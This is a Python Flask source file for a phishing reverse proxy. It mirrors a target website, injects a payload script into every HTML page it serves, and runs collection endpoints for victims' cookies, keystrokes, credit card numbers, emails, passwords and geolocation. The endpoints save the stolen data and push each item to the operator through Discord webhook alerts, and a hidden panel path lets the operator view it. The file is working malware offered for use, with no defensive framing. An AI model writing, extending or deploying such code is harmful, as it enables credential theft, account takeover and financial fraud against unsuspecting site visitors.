from flask import Flask, request, Response, send_from_directory, jsonify, redirect
import requests
import json
import os
from datetime import datetime
import brotli
from core.database import Database
from core.detection import DataDetector
from core.discord_bot import DiscordBot
from colorama import Fore
from functools import wraps
import urllib3

# Initialize components
db = Database()
detector = DataDetector()
discord_bot = None
requests_history = []
MAX_HISTORY = 100

def initialize_discord_bot():
    global discord_bot
    settings = db.get_discord_settings()
    if settings['discord_webhook'] and settings['discord_token']:
        try:
            discord_bot = DiscordBot(settings['discord_webhook'], settings['discord_token'])
            print(f"{Fore.GREEN}[+] Discord bot initialized successfully!{Fore.RESET}")
        except Exception as e:
            print(f"{Fore.RED}[!] Discord bot initialization failed: {str(e)}{Fore.RESET}")

# Initialize storage files
def ensure_json_files():
    files = {
        'cookies.json': [],
        'keylogs.json': [],
        'creditcards.json': [],
        'emails.json': [],
        'passwords.json': [],
        'geolocation.json': [],
        'forms.json': []
    }
    for file, default in files.items():
        if not os.path.exists(file):
            with open(file, 'w') as f:
                json.dump(default, f)

ensure_json_files()
initialize_discord_bot()

def start_proxy(target, host, port, secret):
    app = Flask(__name__, static_folder='panel', static_url_path='')

    # Serve panel files
    @app.route(f'/{secret}')
    def panel_index():
        return send_from_directory('panel', 'index.html')

    @app.route(f'/{secret}/<path:filename>')
    def panel_files(filename):
        return send_from_directory('panel', filename)

    # Serve payload script
    @app.route('/payload-script.js')
    def serve_payload():
        return send_from_directory('.', 'payload-script.js')

    @app.route('/', defaults={'path': ''}, methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    @app.route('/<path:path>', methods=['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS'])
    def proxy(path):
        if path.startswith(secret):
            if path == secret:
                return panel_index()
            filename = path[len(secret)+1:]
            return panel_files(filename)

        # Create session with custom settings
        session = requests.Session()
        session.verify = False
        session.timeout = 10

        # Build target URL
        target_url = f"https://{target}/{path}"
        if request.query_string:
            target_url += f"?{request.query_string.decode()}"

        print(f"{Fore.CYAN}[*] Proxying: {request.method} {target_url}{Fore.RESET}")

        try:
            # Prepare headers
            headers = dict(request.headers)
            headers['Host'] = target
            headers.pop('If-None-Match', None)
            headers.pop('If-Modified-Since', None)

            # Forward the request
            resp = session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=request.get_data(),
                cookies=request.cookies,
                allow_redirects=False,  # Handle redirects manually
                timeout=10
            )

            # Handle redirects within our proxy
            if resp.status_code in [301, 302, 303, 307, 308]:
                location = resp.headers.get('Location', '')
                if location.startswith('/'):
                    location = f"/{location.lstrip('/')}"
                elif location.startswith(f'https://{target}'):
                    location = location[len(f'https://{target}'):]
                return redirect(location, code=resp.status_code)

            # Process response headers
            headers = [(name, value) for name, value in resp.headers.items()
                      if name.lower() not in ['content-length', 'transfer-encoding', 'connection']]

            # Process content
            content = resp.content
            content_type = resp.headers.get('Content-Type', '').lower()

            if 'text/html' in content_type:
                try:
                    decoded = content.decode('utf-8')
                    payload = '<script src="/payload-script.js"></script>'
                    
                    if '</head>' in decoded:
                        decoded = decoded.replace('</head>', f'{payload}</head>')
                    elif '<body>' in decoded:
                        decoded = decoded.replace('<body>', f'<body>{payload}')
                    
                    # Fix relative paths
                    decoded = decoded.replace('href="/', 'href="/')
                    decoded = decoded.replace('src="/', 'src="/')
                    decoded = decoded.replace('action="/', 'action="/')
                    
                    content = decoded.encode('utf-8')
                except:
                    pass  # Use original content if decode fails

            response = Response(content, resp.status_code, headers)

            # Copy cookies from response
            for cookie in resp.cookies:
                response.set_cookie(
                    key=cookie.name,
                    value=cookie.value,
                    domain=request.host,
                    path=cookie.path or '/',
                    secure=cookie.secure,
                    httponly=cookie.has_nonstandard_attr('HttpOnly'),
                    samesite=cookie.get_nonstandard_attr('SameSite', 'Lax')
                )

            return response

        except requests.exceptions.Timeout:
            print(f"{Fore.RED}[!] Request timed out for: {target_url}{Fore.RESET}")
            return "Request timed out. Please try again.", 504

        except requests.exceptions.ConnectionError:
            print(f"{Fore.RED}[!] Connection error for: {target_url}{Fore.RESET}")
            return "Failed to connect to the target server.", 502

        except Exception as e:
            print(f"{Fore.RED}[!] Proxy Error: {str(e)}{Fore.RESET}")
            return "An error occurred while processing your request.", 500

        finally:
            session.close()

    @app.route('/ep/api/cookies', methods=['POST'])
    def handle_cookies():
        data = request.json
        user_ip = request.remote_addr
        
        try:
            with open('cookies.json', 'r') as f:
                cookies = json.load(f)
            
            for cookie in data['cookies']:
                cookie_data = {
                    **cookie,
                    'ip': user_ip,
                    'url': data['url'],
                    'timestamp': data['timestamp']
                }
                cookies.append(cookie_data)
                
                # Save to database
                db.save_cookie(
                    cookie['name'],
                    cookie['value'],
                    user_ip,
                    cookie['domain']
                )
                
                # Send Discord alert
                if discord_bot:
                    discord_bot.send_webhook({
                        "embeds": [{
                            "title": "🍪 New Cookie Captured",
                            "color": 0xff0000,
                            "fields": [
                                {"name": "Name", "value": cookie['name']},
                                {"name": "Value", "value": cookie['value'][:100] + "..." if len(cookie['value']) > 100 else cookie['value']},
                                {"name": "Domain", "value": cookie['domain']},
                                {"name": "URL", "value": data['url']},
                                {"name": "IP", "value": user_ip}
                            ],
                            "timestamp": data['timestamp']
                        }]
                    })
            
            with open('cookies.json', 'w') as f:
                json.dump(cookies, f)
                
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Cookie handling error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/keylogger', methods=['POST'])
    def handle_keylogger():
        data = request.json
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()
        
        try:
            with open('keylogs.json', 'r') as f:
                logs = json.load(f)
            
            keylog_data = {
                'keys': data['keys'],
                'url': data['url'],
                'ip': user_ip,
                'timestamp': timestamp
            }
            logs.append(keylog_data)
            
            with open('keylogs.json', 'w') as f:
                json.dump(logs, f)
            
            # Save to database
            db.save_keystrokes(data['keys'], data['url'], user_ip)
            
            # Send Discord alert
            if discord_bot:
                discord_bot.send_webhook({
                    "embeds": [{
                        "title": "⌨️ Keystrokes Captured",
                        "color": 0x00ff00,
                        "fields": [
                            {"name": "Keys", "value": data['keys']},
                            {"name": "URL", "value": data['url']},
                            {"name": "IP", "value": user_ip}
                        ],
                        "timestamp": timestamp
                    }]
                })
            
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Keylogger error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/sensitive', methods=['POST'])
    def handle_sensitive():
        data = request.json
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()
        
        try:
            # Determine file based on data type
            file_mapping = {
                'credit_card': 'creditcards.json',
                'email': 'emails.json',
                'password': 'passwords.json'
            }
            
            filename = file_mapping.get(data['type'])
            if not filename:
                return jsonify({'status': 'error', 'message': 'Invalid data type'}), 400
            
            with open(filename, 'r') as f:
                sensitive_data = json.load(f)
            
            entry = {
                'value': data['value'],
                'url': data['url'],
                'ip': user_ip,
                'timestamp': timestamp
            }
            sensitive_data.append(entry)
            
            with open(filename, 'w') as f:
                json.dump(sensitive_data, f)
            
            # Save to database
            db.save_sensitive_data(data['type'], data['value'], data['url'], user_ip)
            
            # Send Discord alert
            if discord_bot:
                alert_titles = {
                    'credit_card': '💳 Credit Card Detected',
                    'email': '📧 Email Detected',
                    'password': '🔑 Password Detected'
                }
                
                discord_bot.send_webhook({
                    "embeds": [{
                        "title": alert_titles[data['type']],
                        "color": 0xff0000,
                        "fields": [
                            {"name": "Value", "value": data['value']},
                            {"name": "URL", "value": data['url']},
                            {"name": "IP", "value": user_ip}
                        ],
                        "timestamp": timestamp
                    }]
                })
            
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Sensitive data handling error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/geolocation', methods=['POST'])
    def handle_geolocation():
        data = request.json
        user_ip = request.remote_addr
        timestamp = datetime.now().isoformat()
        
        try:
            with open('geolocation.json', 'r') as f:
                locations = json.load(f)
            
            location_data = {
                **data,
                'ip': user_ip,
                'timestamp': timestamp
            }
            locations.append(location_data)
            
            with open('geolocation.json', 'w') as f:
                json.dump(locations, f)
            
            # Save to database
            db.save_geolocation(
                user_ip,
                data.get('lat'),
                data.get('lon'),
                data.get('country', 'Unknown'),
                data.get('city', 'Unknown')
            )
            
            # Send Discord alert
            if discord_bot:
                discord_bot.send_webhook({
                    "embeds": [{
                        "title": "📍 Location Captured",
                        "color": 0x00ff00,
                        "fields": [
                            {"name": "Latitude", "value": str(data.get('lat', 'N/A'))},
                            {"name": "Longitude", "value": str(data.get('lon', 'N/A'))},
                            {"name": "IP", "value": user_ip},
                            {"name": "URL", "value": data['url']}
                        ],
                        "timestamp": timestamp
                    }]
                })
            
            return jsonify({'status': 'success'}), 200
            
        except Exception as e:
            print(f"Geolocation error: {str(e)}")
            return jsonify({'status': 'error', 'message': str(e)}), 500

    @app.route('/ep/api/settings', methods=['GET', 'POST'])
    def handle_settings():
        global discord_bot
        
        if request.method == 'POST':
            try:
                data = request.json
                webhook = data.get('discord_webhook', '')
                token = data.get('discord_token', '')
                
                # Save to database
                db.save_discord_settings(webhook, token)
                
                # Stop existing bot if any
                if discord_bot:
                    discord_bot.stop()
                
                # Initialize new bot if credentials provided
                if webhook and token:
                    try:
                        discord_bot = DiscordBot(webhook, token)
                        print(f"{Fore.GREEN}[+] Discord bot initialized with new settings{Fore.RESET}")
                    except Exception as e:
                        print(f"{Fore.RED}[!] Failed to initialize Discord bot: {str(e)}{Fore.RESET}")
                        return jsonify({
                            'status': 'error',
                            'message': f'Bot initialization failed: {str(e)}'
                        }), 500
                
                return jsonify({
                    'status': 'success',
                    'message': 'Settings saved successfully'
                }), 200
                
            except Exception as e:
                print(f"{Fore.RED}[!] Settings error: {str(e)}{Fore.RESET}")
                return jsonify({
                    'status': 'error',
                    'message': str(e)
                }), 500
        else:
            # GET request - return current settings
            settings = db.get_discord_settings()
            return jsonify(settings), 200

    # Add this to suppress the InsecureRequestWarning
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    print(f"\n[*] Panel URL: http://{host}:{port}/{secret}")
    print(f"[*] Proxy running on http://{host}:{port}/")
    app.run(host='0.0.0.0', port=port, threaded=True)